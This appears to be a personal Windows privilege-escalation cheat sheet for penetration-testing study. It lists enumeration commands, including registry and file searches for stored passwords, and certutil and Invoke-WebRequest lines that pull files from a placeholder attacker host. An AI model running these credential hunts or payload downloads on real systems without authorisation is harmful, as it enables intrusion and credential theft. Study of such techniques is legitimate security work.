1. Get sysinfo
2. net users
3. net user joe (are they a part of admin group)
5. schtasks /query /fo LIST /v
6. tasklist /SVC
7. wmic /?
8. reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
9. reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
10. dir /s *pass* == *cred* == *vnc* == *.config*
11. findstr /si password *.xml *.ini *.txt
12.  reg query HKLM /f password /t REG_SZ /s
13.  reg query HKCU /f password /t REG_SZ /s



# File Transfers #
1. certutil -urlcache -split -f http://192.168.XXX.XXX:8000/test.txt test.txt'
2. Invoke-WebRequest -Uri http://192.168.XXX.XXX:8000/test.txt -Outfile test.txt

Great Resource: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
